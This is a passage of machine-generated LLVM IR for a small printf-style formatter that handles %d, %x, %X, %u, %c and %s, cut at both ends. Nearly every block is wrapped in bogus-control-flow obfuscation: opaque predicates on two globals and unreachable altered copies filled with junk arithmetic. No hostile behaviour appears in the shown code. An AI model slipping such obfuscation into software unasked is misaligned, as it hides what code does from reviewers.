  store i8* %184, i8** %19, align 8
  %185 = load i8**, i8*** %12, align 8
  %186 = load i8*, i8** %19, align 8
  %187 = icmp ne i8* %186, null
  br i1 %187, label %188, label %190

; <label>:188:                                    ; preds = %181
  %189 = load i8*, i8** %19, align 8
  br label %207

; <label>:190:                                    ; preds = %181
  %191 = load i32, i32* @x.27
  %192 = load i32, i32* @y.28
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %190
  %199 = load i32, i32* @x.27
  %200 = load i32, i32* @y.28
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %207

; <label>:207:                                    ; preds = %originalBBpart222, %188
  %208 = phi i8* [ %189, %188 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i32 0, i32 0), %originalBBpart222 ]
  %209 = load i32, i32* @x.27
  %210 = load i32, i32* @y.28
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %207
  %217 = load i32, i32* %15, align 4
  %218 = load i32, i32* %16, align 4
  %219 = call i32 @prints(i8** %185, i8* %208, i32 %217, i32 %218)
  %220 = load i32, i32* %17, align 4
  %221 = add nsw i32 %220, %219
  store i32 %221, i32* %17, align 4
  %222 = load i32, i32* @x.27
  %223 = load i32, i32* @y.28
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart235, label %originalBB24alteredBB

originalBBpart235:                                ; preds = %originalBB24
  br label %602

; <label>:230:                                    ; preds = %160
  %231 = load i32, i32* @x.27
  %232 = load i32, i32* @y.28
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %230
  %239 = load i8*, i8** %13, align 8
  %240 = load i8, i8* %239, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 100
  %243 = load i32, i32* @x.27
  %244 = load i32, i32* @y.28
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %242, label %251, label %292

; <label>:251:                                    ; preds = %originalBBpart239
  %252 = load i32, i32* @x.27
  %253 = load i32, i32* @y.28
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %251
  %260 = load i8**, i8*** %12, align 8
  %261 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 8
  %264 = icmp ule i32 %263, 40
  %265 = load i32, i32* @x.27
  %266 = load i32, i32* @y.28
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %264, label %273, label %279

; <label>:273:                                    ; preds = %originalBBpart243
  %274 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %261, i32 0, i32 3
  %275 = load i8*, i8** %274, align 8
  %276 = getelementptr i8, i8* %275, i32 %263
  %277 = bitcast i8* %276 to i32*
  %278 = add i32 %263, 8
  store i32 %278, i32* %262, align 8
  br label %284

; <label>:279:                                    ; preds = %originalBBpart243
  %280 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %261, i32 0, i32 2
  %281 = load i8*, i8** %280, align 8
  %282 = bitcast i8* %281 to i32*
  %283 = getelementptr i8, i8* %281, i32 8
  store i8* %283, i8** %280, align 8
  br label %284

; <label>:284:                                    ; preds = %279, %273
  %285 = phi i32* [ %277, %273 ], [ %282, %279 ]
  %286 = load i32, i32* %285, align 4
  %287 = load i32, i32* %15, align 4
  %288 = load i32, i32* %16, align 4
  %289 = call i32 @printi(i8** %260, i32 %286, i32 10, i32 1, i32 %287, i32 %288, i32 97)
  %290 = load i32, i32* %17, align 4
  %291 = add nsw i32 %290, %289
  store i32 %291, i32* %17, align 4
  br label %602

; <label>:292:                                    ; preds = %originalBBpart239
  %293 = load i32, i32* @x.27
  %294 = load i32, i32* @y.28
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %292
  %301 = load i8*, i8** %13, align 8
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp eq i32 %303, 120
  %305 = load i32, i32* @x.27
  %306 = load i32, i32* @y.28
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %304, label %313, label %370

; <label>:313:                                    ; preds = %originalBBpart247
  %314 = load i32, i32* @x.27
  %315 = load i32, i32* @y.28
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %313
  %322 = load i8**, i8*** %12, align 8
  %323 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %324 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 8
  %326 = icmp ule i32 %325, 40
  %327 = load i32, i32* @x.27
  %328 = load i32, i32* @y.28
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %326, label %335, label %341

; <label>:335:                                    ; preds = %originalBBpart251
  %336 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %323, i32 0, i32 3
  %337 = load i8*, i8** %336, align 8
  %338 = getelementptr i8, i8* %337, i32 %325
  %339 = bitcast i8* %338 to i32*
  %340 = add i32 %325, 8
  store i32 %340, i32* %324, align 8
  br label %346

; <label>:341:                                    ; preds = %originalBBpart251
  %342 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %323, i32 0, i32 2
  %343 = load i8*, i8** %342, align 8
  %344 = bitcast i8* %343 to i32*
  %345 = getelementptr i8, i8* %343, i32 8
  store i8* %345, i8** %342, align 8
  br label %346

; <label>:346:                                    ; preds = %341, %335
  %347 = phi i32* [ %339, %335 ], [ %344, %341 ]
  %348 = load i32, i32* @x.27
  %349 = load i32, i32* @y.28
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %346
  %356 = load i32, i32* %347, align 4
  %357 = load i32, i32* %15, align 4
  %358 = load i32, i32* %16, align 4
  %359 = call i32 @printi(i8** %322, i32 %356, i32 16, i32 0, i32 %357, i32 %358, i32 97)
  %360 = load i32, i32* %17, align 4
  %361 = add nsw i32 %360, %359
  store i32 %361, i32* %17, align 4
  %362 = load i32, i32* @x.27
  %363 = load i32, i32* @y.28
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart262, label %originalBB53alteredBB

originalBBpart262:                                ; preds = %originalBB53
  br label %602

; <label>:370:                                    ; preds = %originalBBpart247
  %371 = load i32, i32* @x.27
  %372 = load i32, i32* @y.28
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %370
  %379 = load i8*, i8** %13, align 8
  %380 = load i8, i8* %379, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 88
  %383 = load i32, i32* @x.27
  %384 = load i32, i32* @y.28
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %382, label %391, label %416

; <label>:391:                                    ; preds = %originalBBpart266
  %392 = load i8**, i8*** %12, align 8
  %393 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %394 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %393, i32 0, i32 0
  %395 = load i32, i32* %394, align 8
  %396 = icmp ule i32 %395, 40
  br i1 %396, label %397, label %403

; <label>:397:                                    ; preds = %391
  %398 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %393, i32 0, i32 3
  %399 = load i8*, i8** %398, align 8
  %400 = getelementptr i8, i8* %399, i32 %395
  %401 = bitcast i8* %400 to i32*
  %402 = add i32 %395, 8
  store i32 %402, i32* %394, align 8
  br label %408

; <label>:403:                                    ; preds = %391
  %404 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %393, i32 0, i32 2
  %405 = load i8*, i8** %404, align 8
  %406 = bitcast i8* %405 to i32*
  %407 = getelementptr i8, i8* %405, i32 8
  store i8* %407, i8** %404, align 8
  br label %408

; <label>:408:                                    ; preds = %403, %397
  %409 = phi i32* [ %401, %397 ], [ %406, %403 ]
  %410 = load i32, i32* %409, align 4
  %411 = load i32, i32* %15, align 4
  %412 = load i32, i32* %16, align 4
  %413 = call i32 @printi(i8** %392, i32 %410, i32 16, i32 0, i32 %411, i32 %412, i32 65)
  %414 = load i32, i32* %17, align 4
  %415 = add nsw i32 %414, %413
  store i32 %415, i32* %17, align 4
  br label %602

; <label>:416:                                    ; preds = %originalBBpart266
  %417 = load i32, i32* @x.27
  %418 = load i32, i32* @y.28
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %416
  %425 = load i8*, i8** %13, align 8
  %426 = load i8, i8* %425, align 1
  %427 = zext i8 %426 to i32
  %428 = icmp eq i32 %427, 117
  %429 = load i32, i32* @x.27
  %430 = load i32, i32* @y.28
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %428, label %437, label %494

; <label>:437:                                    ; preds = %originalBBpart270
  %438 = load i32, i32* @x.27
  %439 = load i32, i32* @y.28
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %437
  %446 = load i8**, i8*** %12, align 8
  %447 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %448 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 8
  %450 = icmp ule i32 %449, 40
  %451 = load i32, i32* @x.27
  %452 = load i32, i32* @y.28
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %450, label %459, label %465

; <label>:459:                                    ; preds = %originalBBpart274
  %460 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %447, i32 0, i32 3
  %461 = load i8*, i8** %460, align 8
  %462 = getelementptr i8, i8* %461, i32 %449
  %463 = bitcast i8* %462 to i32*
  %464 = add i32 %449, 8
  store i32 %464, i32* %448, align 8
  br label %486

; <label>:465:                                    ; preds = %originalBBpart274
  %466 = load i32, i32* @x.27
  %467 = load i32, i32* @y.28
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %465
  %474 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %447, i32 0, i32 2
  %475 = load i8*, i8** %474, align 8
  %476 = bitcast i8* %475 to i32*
  %477 = getelementptr i8, i8* %475, i32 8
  store i8* %477, i8** %474, align 8
  %478 = load i32, i32* @x.27
  %479 = load i32, i32* @y.28
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %486

; <label>:486:                                    ; preds = %originalBBpart278, %459
  %487 = phi i32* [ %463, %459 ], [ %476, %originalBBpart278 ]
  %488 = load i32, i32* %487, align 4
  %489 = load i32, i32* %15, align 4
  %490 = load i32, i32* %16, align 4
  %491 = call i32 @printi(i8** %446, i32 %488, i32 10, i32 0, i32 %489, i32 %490, i32 97)
  %492 = load i32, i32* %17, align 4
  %493 = add nsw i32 %492, %491
  store i32 %493, i32* %17, align 4
  br label %602

; <label>:494:                                    ; preds = %originalBBpart270
  %495 = load i32, i32* @x.27
  %496 = load i32, i32* @y.28
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %494
  %503 = load i8*, i8** %13, align 8
  %504 = load i8, i8* %503, align 1
  %505 = zext i8 %504 to i32
  %506 = icmp eq i32 %505, 99
  %507 = load i32, i32* @x.27
  %508 = load i32, i32* @y.28
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %506, label %515, label %576

; <label>:515:                                    ; preds = %originalBBpart282
  %516 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %517 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %516, i32 0, i32 0
  %518 = load i32, i32* %517, align 8
  %519 = icmp ule i32 %518, 40
  br i1 %519, label %520, label %526

; <label>:520:                                    ; preds = %515
  %521 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %516, i32 0, i32 3
  %522 = load i8*, i8** %521, align 8
  %523 = getelementptr i8, i8* %522, i32 %518
  %524 = bitcast i8* %523 to i32*
  %525 = add i32 %518, 8
  store i32 %525, i32* %517, align 8
  br label %547

; <label>:526:                                    ; preds = %515
  %527 = load i32, i32* @x.27
  %528 = load i32, i32* @y.28
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %526
  %535 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %516, i32 0, i32 2
  %536 = load i8*, i8** %535, align 8
  %537 = bitcast i8* %536 to i32*
  %538 = getelementptr i8, i8* %536, i32 8
  store i8* %538, i8** %535, align 8
  %539 = load i32, i32* @x.27
  %540 = load i32, i32* @y.28
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %547

; <label>:547:                                    ; preds = %originalBBpart286, %520
  %548 = phi i32* [ %524, %520 ], [ %537, %originalBBpart286 ]
  %549 = load i32, i32* @x.27
  %550 = load i32, i32* @y.28
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %547
  %557 = load i32, i32* %548, align 4
  %558 = trunc i32 %557 to i8
  %559 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %558, i8* %559, align 1
  %560 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %560, align 1
  %561 = load i8**, i8*** %12, align 8
  %562 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %563 = load i32, i32* %15, align 4
  %564 = load i32, i32* %16, align 4
  %565 = call i32 @prints(i8** %561, i8* %562, i32 %563, i32 %564)
  %566 = load i32, i32* %17, align 4
  %567 = add nsw i32 %566, %565
  store i32 %567, i32* %17, align 4
  %568 = load i32, i32* @x.27
  %569 = load i32, i32* @y.28
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBBpart295, label %originalBB88alteredBB

originalBBpart295:                                ; preds = %originalBB88
  br label %602

; <label>:576:                                    ; preds = %originalBBpart282
  br label %601

; <label>:577:                                    ; preds = %33
  br label %578

; <label>:578:                                    ; preds = %577, %originalBBpart28
  %579 = load i32, i32* @x.27
  %580 = load i32, i32* @y.28
  %581 = sub i32 %579, 1
  %582 = mul i32 %579, %581
  %583 = urem i32 %582, 2
  %584 = icmp eq i32 %583, 0
  %585 = icmp slt i32 %580, 10
  %586 = or i1 %584, %585
  br i1 %586, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %578
  %587 = load i8**, i8*** %12, align 8
  %588 = load i8*, i8** %13, align 8
  %589 = load i8, i8* %588, align 1
  %590 = zext i8 %589 to i32
  call void @printchar(i8** %587, i32 %590)
  %591 = load i32, i32* %17, align 4
  %592 = add nsw i32 %591, 1
  store i32 %592, i32* %17, align 4
  %593 = load i32, i32* @x.27
  %594 = load i32, i32* @y.28
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBBpart2111, label %originalBB97alteredBB

originalBBpart2111:                               ; preds = %originalBB97
  br label %601

; <label>:601:                                    ; preds = %originalBBpart2111, %576
  br label %602

; <label>:602:                                    ; preds = %601, %originalBBpart295, %486, %408, %originalBBpart262, %284, %originalBBpart235
  %603 = load i32, i32* @x.27
  %604 = load i32, i32* @y.28
  %605 = sub i32 %603, 1
  %606 = mul i32 %603, %605
  %607 = urem i32 %606, 2
  %608 = icmp eq i32 %607, 0
  %609 = icmp slt i32 %604, 10
  %610 = or i1 %608, %609
  br i1 %610, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %602
  %611 = load i8*, i8** %13, align 8
  %612 = getelementptr inbounds i8, i8* %611, i32 1
  store i8* %612, i8** %13, align 8
  %613 = load i32, i32* @x.27
  %614 = load i32, i32* @y.28
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %28

; <label>:621:                                    ; preds = %originalBBpart24, %28
  %622 = load i32, i32* @x.27
  %623 = load i32, i32* @y.28
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %621
  %630 = load i8**, i8*** %12, align 8
  %631 = icmp ne i8** %630, null
  %632 = load i32, i32* @x.27
  %633 = load i32, i32* @y.28
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br i1 %631, label %640, label %643

; <label>:640:                                    ; preds = %originalBBpart2119
  %641 = load i8**, i8*** %12, align 8
  %642 = load i8*, i8** %641, align 8
  store i8 0, i8* %642, align 1
  br label %643

; <label>:643:                                    ; preds = %640, %originalBBpart2119
  %644 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %645 = bitcast %struct.__va_list_tag* %644 to i8*
  call void @llvm.va_end(i8* %645)
  %646 = load i32, i32* %17, align 4
  ret i32 %646

originalBBalteredBB:                              ; preds = %originalBB, %3
  %647 = alloca i8**, align 8
  %648 = alloca i8*, align 8
  %649 = alloca %struct.__va_list_tag*, align 8
  %650 = alloca i32, align 4
  %651 = alloca i32, align 4
  %652 = alloca i32, align 4
  %653 = alloca [2 x i8], align 1
  %654 = alloca i8*, align 8
  store i8** %0, i8*** %647, align 8
  store i8* %1, i8** %648, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %649, align 8
  store i32 0, i32* %652, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %67
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %114
  %655 = load i8*, i8** %13, align 8
  %656 = getelementptr inbounds i8, i8* %655, i32 1
  store i8* %656, i8** %13, align 8
  %657 = load i32, i32* %16, align 4
  %_ = sub i32 0, %657
  %gen = add i32 %_, 2
  %_15 = shl i32 %657, 2
  %_16 = shl i32 %657, 2
  %658 = or i32 %657, 2
  store i32 %658, i32* %16, align 4
  br label %originalBB14

originalBB20alteredBB:                            ; preds = %originalBB20, %190
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %207
  %659 = load i32, i32* %15, align 4
  %660 = load i32, i32* %16, align 4
  %661 = call i32 @prints(i8** %185, i8* %208, i32 %659, i32 %660)
  %662 = load i32, i32* %17, align 4
  %_25 = sub i32 0, %662
  %gen26 = add i32 %_25, %661
  %_27 = sub i32 0, %662
  %gen28 = add i32 %_27, %661
  %_29 = sub i32 %662, %661
  %gen30 = mul i32 %_29, %661
  %_31 = sub i32 0, %662
  %gen32 = add i32 %_31, %661
  %_33 = shl i32 %662, %661
  %663 = add nsw i32 %662, %661
  store i32 %663, i32* %17, align 4
  br label %originalBB24

originalBB37alteredBB:                            ; preds = %originalBB37, %230
  %664 = load i8*, i8** %13, align 8
  %665 = load i8, i8* %664, align 1
  %666 = zext i8 %665 to i32
  %667 = icmp eq i32 %666, 100
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %251
  %668 = load i8**, i8*** %12, align 8
  %669 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %670 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %669, i32 0, i32 0
  %671 = load i32, i32* %670, align 8
  %672 = icmp ule i32 %671, 40
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %292
  %673 = load i8*, i8** %13, align 8
  %674 = load i8, i8* %673, align 1
  %675 = zext i8 %674 to i32
  %676 = icmp eq i32 %675, 120
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %313
  %677 = load i8**, i8*** %12, align 8
  %678 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %679 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %678, i32 0, i32 0
  %680 = load i32, i32* %679, align 8
  %681 = icmp ule i32 %680, 40
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %346
  %682 = load i32, i32* %347, align 4
  %683 = load i32, i32* %15, align 4
  %684 = load i32, i32* %16, align 4
  %685 = call i32 @printi(i8** %322, i32 %682, i32 16, i32 0, i32 %683, i32 %684, i32 97)
  %686 = load i32, i32* %17, align 4
  %_54 = sub i32 0, %686
  %gen55 = add i32 %_54, %685
  %_56 = sub i32 0, %686
  %gen57 = add i32 %_56, %685
  %_58 = sub i32 0, %686
  %gen59 = add i32 %_58, %685
  %_60 = shl i32 %686, %685
  %687 = add nsw i32 %686, %685
  store i32 %687, i32* %17, align 4
  br label %originalBB53

originalBB64alteredBB:                            ; preds = %originalBB64, %370
  %688 = load i8*, i8** %13, align 8
  %689 = load i8, i8* %688, align 1
  %690 = zext i8 %689 to i32
  %691 = icmp eq i32 %690, 88
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %416
  %692 = load i8*, i8** %13, align 8
  %693 = load i8, i8* %692, align 1
  %694 = zext i8 %693 to i32
  %695 = icmp eq i32 %694, 117
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %437
  %696 = load i8**, i8*** %12, align 8
  %697 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %698 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %697, i32 0, i32 0
  %699 = load i32, i32* %698, align 8
  %700 = icmp ule i32 %699, 40
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %465
  %701 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %447, i32 0, i32 2
  %702 = load i8*, i8** %701, align 8
  %703 = bitcast i8* %702 to i32*
  %704 = getelementptr i8, i8* %702, i32 8
  store i8* %704, i8** %701, align 8
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %494
  %705 = load i8*, i8** %13, align 8
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 99
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %526
  %709 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %516, i32 0, i32 2
  %710 = load i8*, i8** %709, align 8
  %711 = bitcast i8* %710 to i32*
  %712 = getelementptr i8, i8* %710, i32 8
  store i8* %712, i8** %709, align 8
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %547
  %713 = load i32, i32* %548, align 4
  %714 = trunc i32 %713 to i8
  %715 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 0
  store i8 %714, i8* %715, align 1
